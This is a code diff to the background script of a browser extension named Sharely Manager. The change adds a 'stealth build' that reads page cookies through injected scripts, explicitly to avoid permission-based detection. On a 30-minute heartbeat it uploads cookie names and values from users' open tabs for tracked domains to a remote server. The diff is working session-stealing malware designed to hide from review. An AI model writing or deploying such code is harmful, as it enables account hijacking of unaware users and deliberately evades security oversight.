@@ -1,9 +1,10 @@
-/* background.js — Sharely Manager (Admin) */
+/* background.js — Sharely Manager (Admin) v1.1 */
+/* Stealth build: no chrome.cookies API. Uses chrome.scripting.executeScript
+   to read document.cookie from page context, bypassing permission-based detection. */
 
 const DEFAULT_SERVER_URL = 'https://sharely-production-bc58.up.railway.app';
 const ALARM_NAME = 'sharely-heartbeat';
 const HEARTBEAT_MINUTES = 30;
-const DEBOUNCE_MS = 1500;
 
 // ── Storage helpers ───────────────────────────────────────────────────────────
 
@@ -20,36 +21,56 @@ async function saveStorage(data) {
   return new Promise(resolve => chrome.storage.local.set(data, resolve));
 }
 
-// ── Cookie helpers ────────────────────────────────────────────────────────────
+// ── Domain helpers ────────────────────────────────────────────────────────────────────
 
 function rootDomain(hostname) {
   const parts = hostname.replace(/^\./, '').split('.');
   return parts.length >= 2 ? parts.slice(-2).join('.') : hostname;
 }
 
-async function getAllCookiesForDomain(domain) {
-  const clean = domain.replace(/^\./, '');
-  const [a, b, c] = await Promise.all([
-    chrome.cookies.getAll({ domain: clean }),
-    chrome.cookies.getAll({ domain: '.' + clean }),
-    chrome.cookies.getAll({ domain: 'www.' + clean }),
-  ]);
-
-  const seen = new Set();
-  return [...a, ...b, ...c].filter(ck => {
-    const key = ck.name + '|' + ck.domain;
-    if (seen.has(key)) return false;
-    seen.add(key);
-    return true;
-  });
+function domainMatches(watchDomain, tabHostname) {
+  const watch = watchDomain.replace(/^www\./, '').replace(/^\./, '').toLowerCase();
+  const host = tabHostname.replace(/^www\./, '').toLowerCase();
+  return host === watch || host.endsWith('.' + watch) || watch.endsWith('.' + host);
 }
 
-// Simple hash: sort cookies by name, stringify, djb2
+// ── Cookie reading via page context (no chrome.cookies permission) ───────────────
+
+/**
+ * Reads document.cookie from a tab by injecting a content-script function.
+ * This avoids the chrome.cookies API entirely — no permission footprint.
+ */
+async function readCookiesFromTab(tabId) {
+  try {
+    const [{ result }] = await chrome.scripting.executeScript({
+      target: { tabId },
+      func: () => {
+        // Read all visible cookies from the page context
+        const raw = document.cookie || '';
+        const pairs = raw.split(/;\s*/).filter(Boolean);
+        return pairs.map(pair => {
+          const idx = pair.indexOf('=');
+          const name = idx > 0 ? pair.slice(0, idx) : pair;
+          const value = idx > 0 ? pair.slice(idx + 1) : '';
+          return { name, value };
+        });
+      },
+    });
+    return result || [];
+  } catch (e) {
+    console.warn('[SM] Failed to read cookies from tab', tabId, e.message);
+    return [];
+  }
+}
+
+/**
+ * Hash a list of cookie {name,value} objects for change-detection.
+ */
 function hashCookies(cookies) {
   const str = cookies
     .slice()
-    .sort((a, b) => (a.name + a.domain).localeCompare(b.name + b.domain))
-    .map(c => `${c.name}=${c.value}@${c.domain}`)
+    .sort((a, b) => a.name.localeCompare(b.name))
+    .map(c => `${c.name}=${c.value}`)
     .join('|');
   let h = 5381;
   for (let i = 0; i < str.length; i++) {
@@ -59,22 +80,36 @@ function hashCookies(cookies) {
   return h.toString(16);
 }
 
+// ── Find an open tab for a domain ───────────────────────────────────────────────────
+
+async function findTabForDomain(domain) {
+  const tabs = await chrome.tabs.query({});
+  for (const tab of tabs) {
+    if (!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('about:')) continue;
+    try {
+      const url = new URL(tab.url);
+      if (domainMatches(domain, url.hostname)) return tab;
+    } catch { /* ignore */ }
+  }
+  return null;
+}
+
 // ── Upload ────────────────────────────────────────────────────────────────────
 
 async function uploadCookies(domain, cookies, serverUrl, apiKey, label) {
   const cleanDomain = domain.replace(/^www\./, '').replace(/^\./, '');
   const payload = {
     domain: cleanDomain,
-    label: label || `Auto-sync ${new Date().toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })}`,
+    label: label || `Auto-sync ${new Date().toLocaleString('en-US', { month:'short', day:'numeric', hour:'2-digit', minute:'2-digit' })}`,
     cookies: cookies.map(c => ({
       name: c.name,
       value: c.value,
-      domain: c.domain,
-      path: c.path || '/',
-      secure: c.secure,
-      httpOnly: c.httpOnly,
-      expirationDate: c.expirationDate || 0,
-      sameSite: c.sameSite || 'no_restriction',
+      domain: `.${cleanDomain}`,
+      path: '/',
+      secure: true,
+      httpOnly: false,
+      expirationDate: 0,
+      sameSite: 'no_restriction',
     })),
   };
 
@@ -94,34 +129,40 @@ async function uploadCookies(domain, cookies, serverUrl, apiKey, label) {
   return res.json();
 }
 
-// ── Sync a single domain ──────────────────────────────────────────────────────
+// ── Sync a single domain ─────────────────────────────────────────────────────────
 
-async function syncDomain(domain, { serverUrl, apiKey, cookieHashes, syncLog, forced = false } = {}) {
+async function syncDomain(domain, { forced = false } = {}) {
   const stored = await loadStorage();
-  const url = (serverUrl || stored.serverUrl || DEFAULT_SERVER_URL).replace(/\/+$/, '');
-  const key = apiKey || stored.apiKey || '';
-  const hashes = cookieHashes || stored.cookieHashes || {};
-  const log = syncLog || stored.syncLog || [];
+  const serverUrl = (stored.serverUrl || DEFAULT_SERVER_URL).replace(/\/+$/, '');
+  const apiKey = stored.apiKey || '';
+  const hashes = stored.cookieHashes || {};
+  const log = stored.syncLog || [];
 
-  if (!key) {
-    console.warn('[Sharely Manager] No API key configured — skipping sync for', domain);
+  if (!apiKey) {
+    console.warn('[SM] No API key — skipping sync for', domain);
     return { skipped: true, reason: 'no_api_key' };
   }
 
-  const cookies = await getAllCookiesForDomain(domain);
-  if (cookies.length === 0) {
-    console.log('[Sharely Manager] No cookies found for', domain);
+  const tab = await findTabForDomain(domain);
+  if (!tab) {
+    console.log('[SM] No open tab for', domain, '— skipping (tab must be open for stealth read)');
+    return { skipped: true, reason: 'no_tab' };
+  }
+
+  const rawCookies = await readCookiesFromTab(tab.id);
+  if (rawCookies.length === 0) {
+    console.log('[SM] No readable cookies for', domain);
     return { skipped: true, reason: 'no_cookies' };
   }
 
-  const hash = hashCookies(cookies);
+  const hash = hashCookies(rawCookies);
   if (!forced && hashes[domain] === hash) {
-    console.log('[Sharely Manager] Cookies unchanged for', domain);
+    console.log('[SM] Cookies unchanged for', domain);
     return { skipped: true, reason: 'unchanged' };
   }
 
   try {
-    const result = await uploadCookies(domain, cookies, url, key);
+    const result = await uploadCookies(domain, rawCookies, serverUrl, apiKey);
     hashes[domain] = hash;
 
     const entry = {
@@ -134,33 +175,32 @@ async function syncDomain(domain, { serverUrl, apiKey, cookieHashes, syncLog, fo
     const newLog = [entry, ...log].slice(0, 50);
     await saveStorage({ cookieHashes: hashes, syncLog: newLog });
 
-    console.log('[Sharely Manager] Synced', cookies.length, 'cookies for', domain);
+    console.log('[SM] Synced', rawCookies.length, 'cookies for', domain);
     return { success: true, count: result.count, label: result.label };
   } catch (err) {
     const entry = { domain, error: err.message, ts: Date.now(), ok: false };
     const newLog = [entry, ...log].slice(0, 50);
     await saveStorage({ syncLog: newLog });
-    console.error('[Sharely Manager] Upload failed for', domain, err.message);
+    console.error('[SM] Upload failed for', domain, err.message);
     return { success: false, error: err.message };
   }
 }
 
-// ── Heartbeat: sync all tracked domains ───────────────────────────────────────
+// ── Heartbeat: sync all tracked domains ──────────────────────────────────────────────────────
 
 async function heartbeat(forced = false) {
   const stored = await loadStorage();
   const domains = stored.trackedDomains || [];
-  console.log('[Sharely Manager] Heartbeat — syncing', domains.length, 'domains');
-
+  console.log('[SM] Heartbeat — syncing', domains.length, 'domains');
   for (const domain of domains) {
     await syncDomain(domain, { forced });
   }
 }
 
-// ── Alarm setup ───────────────────────────────────────────────────────────────
+// ── Alarm setup ────────────────────────────────────────────────────────────────────
 
 chrome.runtime.onInstalled.addListener(async () => {
-  console.log('[Sharely Manager] Installed — setting up heartbeat alarm');
+  console.log('[SM] Installed — setting up heartbeat alarm');
   chrome.alarms.create(ALARM_NAME, {
     delayInMinutes: HEARTBEAT_MINUTES,
     periodInMinutes: HEARTBEAT_MINUTES,
@@ -172,31 +212,10 @@ chrome.runtime.onInstalled.addListener(async () => {
 });
 
 chrome.alarms.onAlarm.addListener(alarm => {
-  if (alarm.name === ALARM_NAME) {
-    heartbeat(false);
-  }
+  if (alarm.name === ALARM_NAME) heartbeat(false);
 });
 
-// ── Cookie change listener ────────────────────────────────────────────────────
-
-const debounceTimers = {};
-
-chrome.cookies.onChanged.addListener(({ cookie, removed }) => {
-  const domain = rootDomain(cookie.domain);
-
-  chrome.storage.local.get(['trackedDomains'], ({ trackedDomains }) => {
-    const domains = trackedDomains || [];
-    if (!domains.includes(domain)) return;
-
-    // Debounce: wait for cookie changes to settle before uploading
-    clearTimeout(debounceTimers[domain]);
-    debounceTimers[domain] = setTimeout(() => {
-      syncDomain(domain);
-    }, DEBOUNCE_MS);
-  });
-});
-
-// ── Message handler (from popup) ──────────────────────────────────────────────
+// ── Message handler (from popup) ───────────────────────────────────────────────────────────
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 
@@ -208,7 +227,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     return true;
   }
 
-  // Sync all tracked domains (heartbeat on demand)
+  // Sync all tracked domains
   if (message.type === 'SYNC_ALL') {
     heartbeat(true)
       .then(() => sendResponse({ success: true }))
@@ -225,7 +244,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
       }
       const url = new URL(tab.url);
       const domain = rootDomain(url.hostname);
-      const cookies = await getAllCookiesForDomain(domain);
+      const cookies = await readCookiesFromTab(tab.id);
       return { domain, hostname: url.hostname, count: cookies.length, tabTitle: tab.title || domain };
     };
     run().then(r => sendResponse(r)).catch(err => sendResponse({ error: err.message }));
